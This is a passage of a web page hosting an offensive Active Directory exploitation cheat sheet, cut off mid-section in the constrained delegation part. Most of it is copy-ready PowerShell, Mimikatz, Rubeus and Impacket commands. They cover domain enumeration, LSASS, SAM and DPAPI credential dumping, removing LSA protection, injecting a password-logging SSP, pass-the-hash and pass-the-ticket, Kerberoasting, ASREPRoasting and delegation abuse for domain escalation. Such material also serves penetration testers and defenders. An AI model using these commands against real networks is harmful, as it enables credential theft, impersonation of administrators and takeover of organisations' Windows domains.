Attacks</a><ul><li><a href=#trust-tickets>Trust Tickets</a></li><li><a href=#abuse-mssql-servers>Abuse MSSQL Servers</a></li><li><a href=#breaking-forest-trusts>Breaking Forest Trusts</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h1 id=active-directory-exploitation-cheat-sheet>Active Directory Exploitation Cheat Sheet<a hidden class=anchor aria-hidden=true href=#active-directory-exploitation-cheat-sheet>#</a></h1><p>A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.</p><p>This cheat sheet is inspired by the <a href=https://github.com/swisskyrepo/PayloadsAllTheThings>PayloadAllTheThings</a> repo.</p><p><img alt="Just Walking The Dog" loading=lazy src=https://raw.githubusercontent.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet/master/WalkTheDog.png></p><h2 id=summary>Summary<a hidden class=anchor aria-hidden=true href=#summary>#</a></h2><ul><li><a href=#active-directory-exploitation-cheat-sheet>Active Directory Exploitation Cheat Sheet</a><ul><li><a href=#summary>Summary</a></li><li><a href=#tools>Tools</a></li><li><a href=#domain-enumeration>Domain Enumeration</a><ul><li><a href=#using-powerview>Using PowerView</a></li><li><a href=#using-ad-module>Using AD Module</a></li><li><a href=#using-bloodhound>Using BloodHound</a></li><li><a href=#useful-enumeration-tools>Useful Enumeration Tools</a></li></ul></li><li><a href=#local-privilege-escalation>Local Privilege Escalation</a><ul><li><a href=#useful-local-priv-esc-tools>Useful Local Priv Esc Tools</a></li></ul></li><li><a href=#lateral-movement>Lateral Movement</a><ul><li><a href=#powershell-remoting>Powershell Remoting</a></li><li><a href=#remote-code-execution-with-ps-credentials>Remote Code Execution with PS Credentials</a></li><li><a href=#import-a-powershell-module-and-execute-its-functions-remotely>Import a powershell module and execute its functions remotely</a></li><li><a href=#executing-remote-stateful-commands>Executing Remote Stateful commands</a></li><li><a href=#mimikatz>Mimikatz</a></li><li><a href=#useful-tools>Useful Tools</a></li></ul></li><li><a href=#domain-privilege-escalation>Domain Privilege Escalation</a><ul><li><a href=#kerberoast>Kerberoast</a></li><li><a href=#asreproast>ASREPRoast</a></li><li><a href=#password-spray-attack>Password Spray Attack</a></li><li><a href=#force-set-spn>Force Set SPN</a></li><li><a href=#abusing-shadow-copies>Abusing Shadow Copies</a></li><li><a href=#list-and-decrypt-stored-credentials-using-mimikatz>List and Decrypt Stored Credentials using Mimikatz</a></li><li><a href=#unconstrained-delegation>Unconstrained Delegation</a></li><li><a href=#constrained-delegation>Constrained Delegation</a></li><li><a href=#resource-based-constrained-delegation>Resource Based Constrained Delegation</a></li><li><a href=#dnsadmins-abuse>DNSAdmins Abuse</a></li><li><a href=#abusing-active-directory-integraded-dns>Abusing Active Directory-Integraded DNS</a></li><li><a href=#abusing-backup-operators-group>Abusing Backup Operators Group</a></li><li><a href=#abusing-exchange>Abusing Exchange</a></li><li><a href=#weaponizing-printer-bug>Weaponizing Printer Bug</a></li><li><a href=#abusing-acls>Abusing ACLs</a></li><li><a href=#abusing-ipv6-with-mitm6>Abusing IPv6 with mitm6</a></li><li><a href=#sid-history-abuse>SID History Abuse</a></li><li><a href=#exploiting-sharepoint>Exploiting SharePoint</a></li><li><a href=#zerologon-exploit>Zerologon Exploit</a></li></ul></li><li><a href=#domain-persistence>Domain Persistence</a><ul><li><a href=#golden-ticket-attack>Golden Ticket Attack</a></li><li><a href=#dcsync-attack>DCsync Attack</a></li><li><a href=#silver-ticket-attack>Silver Ticket Attack</a></li><li><a href=#skeleton-key-attack>Skeleton Key Attack</a></li><li><a href=#dsrm-abuse>DSRM Abuse</a></li><li><a href=#custom-ssp>Custom SSP</a></li></ul></li><li><a href=#cross-forest-attacks>Cross Forest Attacks</a><ul><li><a href=#trust-tickets>Trust Tickets</a></li><li><a href=#abuse-mssql-servers>Abuse MSSQL Servers</a></li><li><a href=#breaking-forest-trusts>Breaking Forest Trusts</a></li></ul></li></ul></li></ul><h2 id=tools>Tools<a hidden class=anchor aria-hidden=true href=#tools>#</a></h2><ul><li><a href=https://github.com/PowerShellMafia/PowerSploit/tree/dev>Powersploit</a></li><li><a href=https://github.com/NetSPI/PowerUpSQL>PowerUpSQL</a></li><li><a href=https://github.com/Kevin-Robertson/Powermad>Powermad</a></li><li><a href=https://github.com/SecureAuthCorp/impacket>Impacket</a></li><li><a href=https://github.com/gentilkiwi/mimikatz>Mimikatz</a></li><li><a href=https://github.com/GhostPack/Rubeus>Rubeus</a> -> <a href=https://github.com/r3motecontrol/Ghostpack-CompiledBinaries>Compiled Version</a></li><li><a href=https://github.com/BloodHoundAD/BloodHound>BloodHound</a></li><li><a href=https://github.com/samratashok/ADModule>AD Module</a></li><li><a href=https://github.com/HarmJ0y/ASREPRoast>ASREPRoast</a></li></ul><h2 id=domain-enumeration>Domain Enumeration<a hidden class=anchor aria-hidden=true href=#domain-enumeration>#</a></h2><h3 id=using-powerview>Using PowerView<a hidden class=anchor aria-hidden=true href=#using-powerview>#</a></h3><p><a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1>Powerview v.3.0</a><br><a href=https://powersploit.readthedocs.io/en/latest/>Powerview Wiki</a></p><ul><li><strong>Get Current Domain:</strong> <code>Get-Domain</code></li><li><strong>Enumerate Other Domains:</strong> <code>Get-Domain -Domain &lt;DomainName></code></li><li><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></li><li><strong>Get Domain Policy:</strong><pre tabindex=0><code>Get-DomainPolicy

#Will show us the policy configurations of the Domain about system access or kerberos
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
</code></pre></li><li><strong>Get Domain Controllers:</strong><pre tabindex=0><code>Get-DomainController
Get-DomainController -Domain &lt;DomainName&gt;
</code></pre></li><li><strong>Enumerate Domain Users:</strong><pre tabindex=0><code>#Save all Domain Users to a file
Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

#Will return specific properties of a specific user
Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List

#Enumerate user logged on a machine
Get-NetLoggedon -ComputerName &lt;ComputerName&gt;

#Enumerate Session Information for a machine
Get-NetSession -ComputerName &lt;ComputerName&gt;

#Enumerate domain machines of the current/specified domain where specific users are logged into
Find-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName
</code></pre></li><li><strong>Enum Domain Computers:</strong><pre tabindex=0><code>Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

#Enumerate Live machines 
Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
</code></pre></li><li><strong>Enum Groups and Group Members:</strong><pre tabindex=0><code>#Save all Domain Groups to a file:
Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

#Return members of Specific Group (eg. Domain Admins &amp; Enterprise Admins)
Get-DomainGroup -Identity &#39;&lt;GroupName&gt;&#39; | Select-Object -ExpandProperty Member 
Get-DomainGroupMember -Identity &#39;&lt;GroupName&gt;&#39; | Select-Object MemberDistinguishedName

#Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
Get-NetLocalGroup | Select-Object GroupName

#Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

#Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
</code></pre></li><li><strong>Enumerate Shares:</strong><pre tabindex=0><code>#Enumerate Domain Shares
Find-DomainShare

#Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess

#Enumerate &#34;Interesting&#34; Files on accessible shares
Find-InterestingDomainShareFile -Include *passwords*
</code></pre></li><li><strong>Enum Group Policies:</strong><pre tabindex=0><code>Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

#Enumerate all GPOs to a specific computer
Get-DomainGPO -ComputerIdentity &lt;ComputerName&gt; -Properties DisplayName | Sort-Object -Property DisplayName

#Get users that are part of a Machine&#39;s local Admin group
Get-DomainGPOComputerLocalGroupMapping -ComputerName &lt;ComputerName&gt;
</code></pre></li><li><strong>Enum OUs:</strong><pre tabindex=0><code>Get-DomainOU -Properties Name | Sort-Object -Property Name
</code></pre></li><li><strong>Enum ACLs:</strong><pre tabindex=0><code># Returns the ACLs associated with the specified account
Get-DomaiObjectAcl -Identity &lt;AccountName&gt; -ResolveGUIDs

#Search for interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs

#Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path &#34;\\Path\Of\A\Share&#34;
</code></pre></li><li><strong>Enum Domain Trust:</strong><pre tabindex=0><code>Get-DomainTrust
Get-DomainTrust -Domain &lt;DomainName&gt;

#Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
Get-DomainTrustMapping
</code></pre></li><li><strong>Enum Forest Trust:</strong><pre tabindex=0><code>Get-ForestDomain
Get-ForestDomain -Forest &lt;ForestName&gt;

#Map the Trust of the Forest
Get-ForestTrust
Get-ForestTrust -Forest &lt;ForestName&gt;
</code></pre></li><li><strong>User Hunting:</strong><pre tabindex=0><code>#Finds all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

#Find local admins on all machines of the domain
Find-DomainLocalGroupMember -Verbose

#Find computers were a Domain Admin OR a spesified user has a session
Find-DomainUserLocation | Select-Object UserName, SessionFromName

#Confirming admin access
Test-AdminAccess
</code></pre>:heavy_exclamation_mark: <strong>Priv Esc to Domain Admin with User Hunting:</strong><br>I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him -> Profit!</li></ul><h3 id=using-ad-module>Using AD Module<a hidden class=anchor aria-hidden=true href=#using-ad-module>#</a></h3><ul><li><strong>Get Current Domain:</strong> <code>Get-ADDomain</code></li><li><strong>Enum Other Domains:</strong> <code>Get-ADDomain -Identity &lt;Domain></code></li><li><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></li><li><strong>Get Domain Controlers:</strong><pre tabindex=0><code>Get-ADDomainController
Get-ADDomainController -Identity &lt;DomainName&gt;
</code></pre></li><li><strong>Enumerate Domain Users:</strong><pre tabindex=0><code>Get-ADUser -Filter * -Identity &lt;user&gt; -Properties *

#Get a spesific &#34;string&#34; on a user&#39;s attribute
Get-ADUser -Filter &#39;Description -like &#34;*wtver*&#34;&#39; -Properties Description | select Name, Description
</code></pre></li><li><strong>Enum Domain Computers:</strong><pre tabindex=0><code>Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter * 
</code></pre></li><li><strong>Enum Domain Trust:</strong><pre tabindex=0><code>Get-ADTrust -Filter *
Get-ADTrust -Identity &lt;DomainName&gt;
</code></pre></li><li><strong>Enum Forest Trust:</strong><pre tabindex=0><code>Get-ADForest
Get-ADForest -Identity &lt;ForestName&gt;

#Domains of Forest Enumeration
(Get-ADForest).Domains
</code></pre></li><li><strong>Enum Local AppLocker Effective Policy:</strong></li></ul><pre tabindex=0><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
</code></pre><h3 id=using-bloodhound>Using BloodHound<a hidden class=anchor aria-hidden=true href=#using-bloodhound>#</a></h3><pre tabindex=0><code>#Using exe ingestor
.\SharpHound.exe --CollectionMethod All --LDAPUser &lt;UserName&gt; --LDAPPass &lt;Password&gt; --JSONFolder &lt;PathToFile&gt;
    
#Using powershell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All  -LDAPUser &lt;UserName&gt; -LDAPPass &lt;Password&gt; -OutputDirectory &lt;PathToFile&gt;
</code></pre><h3 id=useful-enumeration-tools>Useful Enumeration Tools<a hidden class=anchor aria-hidden=true href=#useful-enumeration-tools>#</a></h3><ul><li><a href=https://github.com/dirkjanm/ldapdomaindump>ldapdomaindump</a> Information dumper via LDAP</li><li><a href=https://github.com/dirkjanm/adidnsdump>adidnsdump</a> Integrated DNS dumping by any authenticated user</li><li><a href=https://github.com/cyberark/ACLight>ACLight</a> Advanced Discovery of Privileged Accounts</li><li><a href=https://github.com/sense-of-security/ADRecon>ADRecon</a> Detailed Active Directory Recon Tool</li></ul><h2 id=local-privilege-escalation>Local Privilege Escalation<a hidden class=anchor aria-hidden=true href=#local-privilege-escalation>#</a></h2><h3 id=useful-local-priv-esc-tools>Useful Local Priv Esc Tools<a hidden class=anchor aria-hidden=true href=#useful-local-priv-esc-tools>#</a></h3><ul><li><p><a href=https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1>PowerUp</a> Misconfiguration Abuse</p></li><li><p><a href=https://github.com/AlessandroZ/BeRoot>BeRoot</a> General Priv Esc Enumeration Tool</p></li><li><p><a href=https://github.com/enjoiz/Privesc>Privesc</a> General Priv Esc Enumeration Tool</p></li><li><p><a href=https://github.com/itm4n/FullPowers>FullPowers</a> Restore A Service Account&rsquo;s Privileges</p></li><li><p><a href=https://github.com/ohpe/juicy-potato>Juicy Potato</a> Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation</p><p>:warning: Works only until Windows Server 2016 and Windows 10 until patch 1803</p></li><li><p><a href=https://github.com/TsukiCTF/Lovely-Potato>Lovely Potato</a> Automated Juicy Potato</p><p>:warning: Works only until Windows Server 2016 and Windows 10 until patch 1803</p></li><li><p><a href=https://github.com/itm4n/PrintSpoofer>PrintSpoofer</a> Exploit the PrinterBug for System Impersonation</p><p>:pray: Works for Windows Server 2019 and Windows 10</p></li><li><p><a href=https://github.com/antonioCoco/RoguePotato>RoguePotato</a> Upgraded Juicy Potato</p><p>:pray: Works for Windows Server 2019 and Windows 10</p></li><li><p><a href=https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/>Abusing Token Privileges</a></p></li><li><p><a href=https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/>SMBGhost CVE-2020-0796</a><br><a href=https://github.com/danigargu/CVE-2020-0796>PoC</a></p></li></ul><h2 id=lateral-movement>Lateral Movement<a hidden class=anchor aria-hidden=true href=#lateral-movement>#</a></h2><h3 id=powershell-remoting>Powershell Remoting<a hidden class=anchor aria-hidden=true href=#powershell-remoting>#</a></h3><pre tabindex=0><code>#Enable Powershell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting

#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -ComputerName &lt;Name&gt;
Enter-PSSession -ComputerName &lt;Name&gt; OR -Sessions &lt;SessionName&gt;
</code></pre><h3 id=remote-code-execution-with-ps-credentials>Remote Code Execution with PS Credentials<a hidden class=anchor aria-hidden=true href=#remote-code-execution-with-ps-credentials>#</a></h3><pre tabindex=0><code>$SecPassword = ConvertTo-SecureString &#39;&lt;Wtver&gt;&#39; -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(&#39;htb.local\&lt;WtverUser&gt;&#39;, $SecPassword)
Invoke-Command -ComputerName &lt;WtverMachine&gt; -Credential $Cred -ScriptBlock {whoami}
</code></pre><h3 id=import-a-powershell-module-and-execute-its-functions-remotely>Import a powershell module and execute its functions remotely<a hidden class=anchor aria-hidden=true href=#import-a-powershell-module-and-execute-its-functions-remotely>#</a></h3><pre tabindex=0><code>#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName &lt;NameOfComputer&gt; -FilePath c:\FilePath\file.ps1 -Session $sess 

#Interact with the session
Enter-PSSession -Session $sess
</code></pre><h3 id=executing-remote-stateful-commands>Executing Remote Stateful commands<a hidden class=anchor aria-hidden=true href=#executing-remote-stateful-commands>#</a></h3><pre tabindex=0><code>#Create a new session
$sess = New-PSSession -ComputerName &lt;NameOfComputer&gt;

#Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

#Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
</code></pre><h3 id=mimikatz>Mimikatz<a hidden class=anchor aria-hidden=true href=#mimikatz>#</a></h3><pre tabindex=0><code>#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:&lt;UserName&gt; /ntlm:&lt;&gt; /domain:&lt;DomainFQDN&gt;

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler&#39;s Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain&#39;s Credentials without touching DC&#39;s LSASS and also remotely
mimikatz lsadump::dcsync /domain:&lt;DomainFQDN&gt; /all

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt &lt;PathToKirbiFile&gt;

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
</code></pre><p>:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ? \</p><ul><li>LSA as a Protected Process (Kernel Land Bypass)</li></ul><pre tabindex=0><code>#Check if LSA runs as a protected process by looking if the variable &#34;RunAsPPL&#34; is set to 0x1
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

#Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
#Now lets import the mimidriver.sys to the system
mimikatz # !+

#Now lets remove the protection flags from lsass.exe process
mimikatz # !processprotect /process:lsass.exe /remove

#Finally run the logonpasswords function to dump lsass
mimikatz # sekurlsa::logonpasswords
</code></pre><ul><li><p>LSA as a Protected Process (Userland Land &ldquo;Fileless&rdquo; Bypass)</p><ul><li><a href=https://github.com/itm4n/PPLdump>PPLdump</a></li><li><a href=https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland>Bypassing LSA Protection in Userland</a></li></ul></li><li><p>LSA is running as virtualized process (LSAISO) by Credential Guard</p></li></ul><pre tabindex=0><code>#Check if a process called lsaiso.exe exists on the running processes
tasklist |findstr lsaiso

#If it does there isn&#39;t a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
#Lets inject our own malicious Security Support Provider into memory, for this example i&#39;ll use the one mimikatz provides
mimikatz # misc::memssp

#Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
</code></pre><ul><li><a href="https://adsecurity.org/?page_id=1821">Detailed Mimikatz Guide</a></li><li><a href=https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a>Poking Around With 2 lsass Protection Options</a></li></ul><h3 id=useful-tools>Useful Tools<a hidden class=anchor aria-hidden=true href=#useful-tools>#</a></h3><ul><li><a href=https://github.com/besimorhino/powercat>Powercat</a> netcat written in powershell, and provides tunneling, relay and portforward
capabilities.</li><li><a href=https://github.com/Mr-Un1k0d3r/SCShell>SCShell</a> fileless lateral movement tool that relies on ChangeServiceConfigA to run command</li><li><a href=https://github.com/Hackplayers/evil-winrm>Evil-Winrm</a> the ultimate WinRM shell for hacking/pentesting</li><li><a href=https://github.com/antonioCoco/RunasCs>RunasCs</a> Csharp and open version of windows builtin runas.exe</li></ul><h2 id=domain-privilege-escalation>Domain Privilege Escalation<a hidden class=anchor aria-hidden=true href=#domain-privilege-escalation>#</a></h2><h3 id=kerberoast>Kerberoast<a hidden class=anchor aria-hidden=true href=#kerberoast>#</a></h3><p><em>WUT IS DIS?:</em><br>All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a &ldquo;user&rdquo;<br>account, extract the encrypted blob that was encrypted using the user&rsquo;s password and bruteforce it offline.</p><ul><li>PowerView:</li></ul><pre tabindex=0><code>#Get User Accounts that are used as Service Accounts
Get-NetUser -SPN

#Get every available SPN account, request a TGS and dump its hash
Invoke-Kerberoast

#Requesting the TGS for a single account:
Request-SPNTicket
  
#Export all tickets using Mimikatz
Invoke-Mimikatz -Command &#39;&#34;kerberos::list /export&#34;&#39;
</code></pre><ul><li>AD Module:</li></ul><pre tabindex=0><code>#Get User Accounts that are used as Service Accounts
Get-ADUser -Filter {ServicePrincipalName -ne &#34;$null&#34;} -Properties ServicePrincipalName
</code></pre><ul><li>Impacket:</li></ul><pre tabindex=0><code>python GetUserSPNs.py &lt;DomainName&gt;/&lt;DomainUser&gt;:&lt;Password&gt; -outputfile &lt;FileName&gt;
</code></pre><ul><li>Rubeus:</li></ul><pre tabindex=0><code>#Kerberoasting and outputing on a file with a spesific format
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt;

#Kerberoasting whle being &#34;OPSEC&#34; safe, essentially while not try to roast AES enabled accounts
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /rc4opsec

#Kerberoast AES enabled accounts
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /aes
 
#Kerberoast spesific user account
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /user:&lt;username&gt; /simple

#Kerberoast by specifying the authentication credentials 
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /creduser:&lt;username&gt; /credpassword:&lt;password&gt;
</code></pre><h3 id=asreproast>ASREPRoast<a hidden class=anchor aria-hidden=true href=#asreproast>#</a></h3><p><em>WUT IS DIS?:</em><br>If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted<br>blob and bruteforce it offline.</p><ul><li>PowerView: <code>Get-DomainUser -PreauthNotRequired -Verbose</code></li><li>AD Module: <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth</code></li></ul><p>Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more!
Check for interesting permissions on accounts:</p><p><strong>Hint:</strong> We add a filter e.g. RDPUsers to get &ldquo;User Accounts&rdquo; not Machine Accounts, because Machine Account hashes are not crackable!</p><p>PowerView:</p><pre tabindex=0><code>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match &#34;RDPUsers&#34;}
Disable Kerberos Preauth:
Set-DomainObject -Identity &lt;UserAccount&gt; -XOR @{useraccountcontrol=4194304} -Verbose
Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose
</code></pre><p>And finally execute the attack using the <a href=https://github.com/HarmJ0y/ASREPRoast>ASREPRoast</a> tool.</p><pre tabindex=0><code>#Get a spesific Accounts hash:
Get-ASREPHash -UserName &lt;UserName&gt; -Verbose

#Get any ASREPRoastable Users hashes:
Invoke-ASREPRoast -Verbose
</code></pre><p>Using Rubeus:</p><pre tabindex=0><code>#Trying the attack for all domain users
Rubeus.exe asreproast /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;

#ASREPRoast spesific user
Rubeus.exe asreproast /user:&lt;username&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;

#ASREPRoast users of a spesific OU (Organization Unit)
Rubeus.exe asreproast /ou:&lt;OUName&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;
</code></pre><p>Using Impacket:</p><pre tabindex=0><code>#Trying the attack for the specified users on the file
python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -outputfile &lt;FileName&gt;
</code></pre><h3 id=password-spray-attack>Password Spray Attack<a hidden class=anchor aria-hidden=true href=#password-spray-attack>#</a></h3><p>If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse
on other domain accounts.</p><p><strong>Tools:</strong></p><ul><li><a href=https://github.com/dafthack/DomainPasswordSpray>DomainPasswordSpray</a></li><li><a href=https://github.com/byt3bl33d3r/CrackMapExec>CrackMapExec</a></li><li><a href=https://github.com/wavestone-cdt/Invoke-CleverSpray>Invoke-CleverSpray</a></li><li><a href=https://github.com/Greenwolf/Spray>Spray</a></li></ul><h3 id=force-set-spn>Force Set SPN<a hidden class=anchor aria-hidden=true href=#force-set-spn>#</a></h3><p><em>WUT IS DIS ?:
If we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it.</em></p><ul><li>PowerView:</li></ul><pre tabindex=0><code>#Check for interesting permissions on accounts:
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match &#34;RDPUsers&#34;}
 
#Check if current user has already an SPN setted:
Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname
 
#Force set the SPN on the account:
Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname=&#39;ops/whatever1&#39;}
</code></pre><ul><li>AD Module:</li></ul><pre tabindex=0><code>#Check if current user has already an SPN setted
Get-ADUser -Identity &lt;UserName&gt; -Properties ServicePrincipalName | select ServicePrincipalName
  
#Force set the SPN on the account:
Set-ADUser -Identiny &lt;UserName&gt; -ServicePrincipalNames @{Add=&#39;ops/whatever1&#39;}
</code></pre><p>Finally use any tool from before to grab the hash and kerberoast it!</p><h3 id=abusing-shadow-copies>Abusing Shadow Copies<a hidden class=anchor aria-hidden=true href=#abusing-shadow-copies>#</a></h3><p>If you have local administrator access on a machine try to list shadow copies, it&rsquo;s an easy way for Domain Escalation.</p><pre tabindex=0><code>#List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows
  
#List shadow copies using diskshadow
diskshadow list shadows all
  
#Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
</code></pre><ol><li>You can dump the backuped SAM database and harvest credentials.</li><li>Look for DPAPI stored creds and decrypt them.</li><li>Access backuped sensitive files.</li></ol><h3 id=list-and-decrypt-stored-credentials-using-mimikatz>List and Decrypt Stored Credentials using Mimikatz<a hidden class=anchor aria-hidden=true href=#list-and-decrypt-stored-credentials-using-mimikatz>#</a></h3><p>Usually encrypted credentials are stored in:</p><ul><li><code>%appdata%\Microsoft\Credentials</code></li><li><code>%localappdata%\Microsoft\Credentials</code></li></ul><pre tabindex=0><code>#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
dpapi::cred /in:&#34;%appdata%\Microsoft\Credentials\&lt;CredHash&gt;&#34;

#From the previous command we are interested to the &#34;guidMasterKey&#34; parameter, that tells us which masterkey was used to encrypt the credential
#Lets enumerate the Master Key:
dpapi::masterkey /in:&#34;%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&#34;

#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
dpapi::masterkey /in:&#34;%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&#34; /rpc

#We now have the masterkey in our local cache:
dpapi::cache

#Finally we can decrypt the credential using the cached masterkey:
dpapi::cred /in:&#34;%appdata%\Microsoft\Credentials\&lt;CredHash&gt;&#34;
</code></pre><p>Detailed Article:
<a href=https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials>DPAPI all the things</a></p><h3 id=unconstrained-delegation>Unconstrained Delegation<a hidden class=anchor aria-hidden=true href=#unconstrained-delegation>#</a></h3><p><em>WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a
high value target or DA to connect to it, steal his TGT then ptt and impersonate him!</em></p><p>Using PowerView:</p><pre tabindex=0><code>#Discover domain joined computers that have Unconstrained Delegation enabled
Get-NetComputer -UnConstrained

#List tickets and check if a DA or some High Value target has stored its TGT
Invoke-Mimikatz -Command &#39;&#34;sekurlsa::tickets&#34;&#39;

#Command to monitor any incoming sessions on our compromised server
Invoke-UserHunter -ComputerName &lt;NameOfTheComputer&gt; -Poll &lt;TimeOfMonitoringInSeconds&gt; -UserName &lt;UserToMonitorFor&gt; -Delay   
&lt;WaitInterval&gt; -Verbose

#Dump the tickets to disk:
Invoke-Mimikatz -Command &#39;&#34;sekurlsa::tickets /export&#34;&#39;

#Impersonate the user using ptt attack:
Invoke-Mimikatz -Command &#39;&#34;kerberos::ptt &lt;PathToTicket&gt;&#34;&#39;
</code></pre><p><strong>Note:</strong> We can also use Rubeus!</p><h3 id=constrained-delegation>Constrained Delegation<a hidden class=anchor aria-hidden=true href=#constrained-delegation>#</a></h3><p>Using PowerView and Kekeo:</p><pre tabindex=0><code>#Enumerate Users and Computers with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
tgt::ask /user:&lt;UserName&gt; /domain:&lt;Domain&#39;s FQDN&gt; /rc4:&lt;hashedPasswordOfTheUser&gt;

#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
tgs::s4u /tgt:&lt;PathToTGT&gt; /user:&lt;UserToImpersonate&gt;@&lt;Domain&#39;s FQDN&gt; /service:&lt;Service&#39;s SPN&gt;

#Finally use mimikatz to ptt the TGS
Invoke-Mimikatz -Command &#39;&#34;kerberos::ptt &lt;PathToTGS&gt;&#34;&#39;
</code></pre><p><em>ALTERNATIVE:</em>
